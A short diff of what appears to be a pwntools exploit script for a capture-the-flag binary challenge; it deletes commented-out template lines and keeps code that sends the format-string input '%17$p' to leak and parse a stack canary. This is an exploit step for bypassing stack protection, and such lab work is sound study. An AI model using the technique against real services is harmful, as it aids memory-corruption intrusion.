@@ -58,17 +58,6 @@ continue
 
 io = start()
 
-# shellcode = asm(shellcraft.sh())
-# payload = fit({
-#     32: 0xdeadbeef,
-#     'iaaa': [1, 2, 'Hello', 3]
-# }, length=128)
-# io.send(payload)
-# flag = io.recv(...)
-# log.success(flag)
-
-#io.recvline()
-
 io.sendline(b'%17$p') # get canary
 canary = int(io.recvline().split(b'?')[1].split(b'...')[0], 16)
 log.success("Canary found %d, %s", canary, p64(canary))
